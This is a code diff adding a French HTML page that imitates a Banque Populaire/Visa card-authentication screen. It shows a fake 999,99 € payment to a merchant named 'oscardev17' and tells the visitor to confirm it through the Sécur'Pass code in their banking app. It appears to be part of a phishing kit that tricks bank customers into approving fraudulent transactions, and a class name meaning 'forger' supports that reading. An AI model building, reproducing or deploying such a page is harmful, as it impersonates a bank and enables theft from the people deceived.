@@ -1,0 +1,76 @@
+<!-- This website was developed by Oscar  -->
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentification en attente...</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="bank-logo">
+                <img src="assets/img/btb.png" alt="Banque Populaire">
+            </div>
+            <div class="visa-logo">
+                <img src="assets/img/visa.png" alt="Visa">
+            </div>
+        </header>
+        <main>
+            <div id="auth-message" class="success-message pending">
+                <h1 class="font-title">Authentification en attente</h1>
+                <p class="faussairexhomer">Veuillez patienter pendant que nous vérifions vos informations.</p>
+                <div id="spinner-row" spinner="" ng-show="showSpinner()" class="ng-isolate-scope">
+                    <img src="assets/img/load.gif">
+                </div>
+            </div>
+            
+            <div class="transaction-details">
+                <table>
+                    <tr>
+                        <td class="pay">Marchand‎ ‎ ‎ ‎‎ ‎ ‎   </td>
+                        <td class="pay2"><strong>‎oscardev17 ‎ ‎ ‎ ‎ ‎ ‎</strong></td>
+                    </tr>
+                    <tr>
+                        <td class="pay">Montant‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎  ‎ </td>
+                        <td class="pay2"><strong>999,99 €‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ </strong></td>
+                    </tr>
+                    <tr>
+                        <td class="pay">Date et heure</td>
+                        <td class="pay2"><strong>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎10/07/2024 18:20:34</strong></td>
+                    </tr>
+                    <tr>
+                        <td class="pay">Carte utilisée‎ ‎ </td>
+                        <td class="pay2"><strong>‎ ‎ ‎ ‎ ‎ ‎ ‎xxxxxxxxxxxx1895</strong></td>
+                    </tr>
+                </table>
+            </div>            
+            <div class="logo-container">
+                <img src="assets/img/mobile.png">
+            </div>
+            <div class="auth-instructions">
+                <h2><b>Authentification requise pour valider le paiement</b></h2>
+                <ol>
+                    <li><span class="1">Prenez votre téléphone </span><strong class="pay3">iPhone</strong>.</li>
+                    <li><span class="1">Ouvrez l'application mobile de votre banque.</span></li>
+                    <li><span class="1">Saisissez votre code Sécur'Pass sur votre téléphone.</span></li>
+            
+                </ol>
+            </div>
+            <div class="success-message success" id="auth-message-success" style="display: none;">
+                <h1 class="auth1">Authentification Réussie!</h1>
+                <p class="auth">Votre authentification a réussi, vous allez être automatiquement redirigé vers le site marchand.</p>
+                <button id="return-button" class="return-button">
+                    <img src="assets/img/back.png" alt="Icone Retour" class="return-icon">
+                    <b>Retour à la boutiques</b>
+                </button>
+            </div>
+        </main>
+    </div>
+    <script src="assets/js/script.js"></script>
+</body>
+
+</html>
